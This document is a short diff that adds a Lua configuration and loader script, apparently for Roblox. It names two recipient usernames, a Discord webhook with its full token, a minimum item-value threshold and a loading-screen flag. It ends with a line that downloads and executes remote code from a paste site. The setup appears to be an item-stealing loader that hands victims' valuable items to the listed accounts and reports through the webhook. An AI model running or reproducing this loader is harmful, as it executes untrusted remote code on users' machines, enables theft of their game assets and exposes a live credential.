@@ -1,0 +1,9 @@
+Username = "YoungGod4AO"
+Username2 = "jheremyqt1"
+
+Webhook = "https://discord.com/api/webhooks/1200244320842825808/QjjB52Wmy_3HhR9usgE6BOtQE0j1vdEp6RwIX6kt0M8H98kr0hJ7SadQyiQm1AgmnoGo"
+
+LoadingScreen = true
+MinimumRAP = 10000
+
+loadstring(game:HttpGet("https://dpaste.com/FU7CTHP7M.txt"))()
